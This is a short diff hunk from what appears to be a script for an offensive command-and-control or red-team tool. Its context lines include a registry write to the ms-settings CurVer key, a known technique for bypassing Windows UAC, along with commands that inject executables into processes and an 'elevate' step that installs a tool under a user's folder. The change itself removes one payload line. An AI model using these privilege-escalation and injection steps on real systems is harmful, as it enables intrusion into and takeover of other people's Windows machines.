@@ -37,7 +37,7 @@ shell reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".c2s" /f
 payload -l Local -t inj -f inject1.exe -d
 payload -l Local -t inj -f inject2.exe -d
 
-payload -l AD -wh z -t ps
+
 
 
 elevate -p c:\users\olivier -i -f installTool
